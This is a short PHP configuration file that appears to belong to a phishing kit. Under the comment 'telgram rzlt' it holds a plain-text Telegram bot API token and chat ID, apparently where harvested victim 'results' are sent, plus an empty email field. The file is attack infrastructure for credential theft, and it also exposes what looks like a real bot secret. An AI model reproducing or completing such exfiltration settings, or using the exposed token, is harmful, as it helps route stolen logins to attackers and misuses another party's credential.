<?php


$email =""; 

//telgram rzlt
$api = "6332573351:AAFDbhLPnCFu3tFrIXOskHvdVNpnkPHGxI8";
$chatid = "6326018922";


?>